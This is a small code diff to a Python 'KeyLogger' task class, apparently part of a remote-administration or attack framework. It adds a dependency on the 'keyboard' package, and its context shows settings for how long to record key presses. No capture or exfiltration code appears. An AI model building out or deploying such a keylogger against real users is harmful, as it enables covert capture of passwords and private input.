@@ -8,6 +8,7 @@ class KeyLogger(Task):
     administrator = {"win32": False, "linux": True, "darwin": True}
     kwargs = {"buffer": {"type": int, "description": "Maximum length of one string of keys.", "default": 100},
               "log_time": {"type": int, "description": "Time to record pressed keys in minutes.", "default": 15}}
+    packages = ["keyboard"]
 
     def __init__(self, task_id):
         super(KeyLogger, self).__init__(task_id)
